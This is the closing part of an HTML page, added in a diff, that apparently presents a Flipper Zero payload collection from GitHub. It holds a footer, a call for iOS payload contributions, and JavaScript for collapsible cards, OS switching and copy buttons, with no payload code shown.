+        <div class="card-foot"><a class="gh-link" href="https://github.com/bst04/payloads_flipperZero" target="_blank" rel="noopener"><svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg> View on GitHub</a></div>
+      </article>
+    </div>
+  </div>
+
+  <div class="contribute">
+    <div class="contribute-body">
+      <div class="contribute-title">
+        <svg width="11" height="11" viewBox="0 0 16 16" fill="currentColor"><path d="M1.5 3.25a2.25 2.25 0 1 1 3 2.122v5.256a2.251 2.251 0 1 1-1.5 0V5.372A2.25 2.25 0 0 1 1.5 3.25Zm5.677-.177L9.573.677A.25.25 0 0 1 10 .854V2.5h1A2.5 2.5 0 0 1 13.5 5v5.628a2.251 2.251 0 1 1-1.5 0V5a1 1 0 0 0-1-1h-1v1.646a.25.25 0 0 1-.427.177L7.177 3.427a.25.25 0 0 1 0-.354Z"/></svg>
+        iOS payloads are limited — help grow this!
+      </div>
+      <p class="contribute-desc">iOS payloads are tricky to write. If you have one that works, share it via a pull request on GitHub.</p>
+    </div>
+    <div class="contribute-actions">
+      <a class="btn btn-ghost" href="https://github.com/bst04/payloads_flipperZero/fork" target="_blank" rel="noopener">Fork repo</a>
+      <a class="btn btn-solid" href="https://github.com/bst04/payloads_flipperZero/pulls" target="_blank" rel="noopener">Open a Pull Request</a>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<!-- FOOTER -->
+<footer>
+  <span>🐬 <a href="https://github.com/bst04/payloads_flipperZero" target="_blank" rel="noopener">bst04/payloads_flipperZero</a> · GPL-3.0</span>
+  <span>Educational use only</span>
+</footer>
+
+</div>
+
+<script>
+/* ── COLLAPSIBLE CARDS ── */
+document.querySelectorAll('.card').forEach(card => {
+  const code = card.querySelector('.code-block');
+  const foot = card.querySelector('.card-foot');
+  const tags = card.querySelector('.tags');
+  if (!code || !tags) return;
+
+  const body = document.createElement('div');
+  body.className = 'card-body';
+  code.parentNode.insertBefore(body, code);
+  body.appendChild(code);
+  if (foot) body.appendChild(foot);
+
+  const btn = document.createElement('button');
+  btn.className = 'toggle-btn';
+  btn.innerHTML = '<span class="t-arrow">▾</span> View payload';
+  btn.addEventListener('click', () => {
+    const open = body.classList.toggle('open');
+    btn.classList.toggle('open', open);
+    btn.innerHTML = open
+      ? '<span class="t-arrow">▾</span> Hide'
+      : '<span class="t-arrow">▾</span> View payload';
+  });
+  tags.insertAdjacentElement('afterend', btn);
+});
+
+/* ── DRAWER ── */
+let drawerOpen = false;
+function toggleDrawer() {
+  drawerOpen = !drawerOpen;
+  document.getElementById('sidebar').classList.toggle('open', drawerOpen);
+  document.getElementById('overlay').classList.toggle('open', drawerOpen);
+  document.body.style.overflow = drawerOpen ? 'hidden' : '';
+}
+
+function closeDrawer() {
+  if (drawerOpen) toggleDrawer();
+}
+
+// Close on Escape
+document.addEventListener('keydown', e => {
+  if (e.key === 'Escape') closeDrawer();
+});
+
+/* ── OS SWITCH ── */
+function switchOS(os) {
+  document.querySelectorAll('.os-section').forEach(s => s.classList.remove('active'));
+  document.querySelectorAll('.os-btn').forEach(b => b.classList.remove('active'));
+  document.querySelectorAll('.cat-nav').forEach(n => n.classList.remove('open'));
+  document.getElementById('section-' + os)?.classList.add('active');
+  document.querySelector('[data-os="' + os + '"]')?.classList.add('active');
+  document.getElementById('cnav-' + os)?.classList.add('open');
+  try { sessionStorage.setItem('fz-os', os); } catch(e) {}
+
+  // On mobile: close drawer + scroll to top
+  if (window.innerWidth <= 900) {
+    closeDrawer();
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+}
+
+function scrollCat(os, cat, e) {
+  const el = document.getElementById(os + '-' + cat);
+  if (!el) return;
+  document.querySelectorAll('#cnav-' + os + ' .cat-btn').forEach(b => b.classList.remove('active'));
+  e.currentTarget.classList.add('active');
+  closeDrawer();
+  setTimeout(() => {
+    const top = el.getBoundingClientRect().top + window.scrollY - 68;
+    window.scrollTo({ top, behavior: 'smooth' });
+  }, drawerOpen ? 280 : 0);
+}
+
+/* ── COPY ── */
+const GH_SVG = '<svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"/><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5z"/></svg>';
+const CHECK_SVG = '<svg width="10" height="10" viewBox="0 0 16 16" fill="currentColor"><path d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"/></svg>';
+
+function copyCode(btn) {
+  const text = btn.closest('.code-block').querySelector('pre code').innerText;
+  const orig = btn.innerHTML;
+  const ok = () => {
+    btn.innerHTML = CHECK_SVG + ' Copied!';
+    btn.classList.add('done');
+    setTimeout(() => { btn.innerHTML = orig; btn.classList.remove('done'); }, 1800);
+  };
+  navigator.clipboard?.writeText(text).then(ok).catch(() => {
+    const ta = document.createElement('textarea');
+    ta.value = text; ta.style.cssText = 'position:fixed;opacity:0;top:-9999px';
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); ok(); } catch(e){}
+    document.body.removeChild(ta);
+  });
+}
+
+/* ── INIT ── */
+(function() {
+  let os = 'windows';
+  try { os = sessionStorage.getItem('fz-os') || 'windows'; } catch(e) {}
+  switchOS(os);
+})();
+</script>
+</body>
+</html>
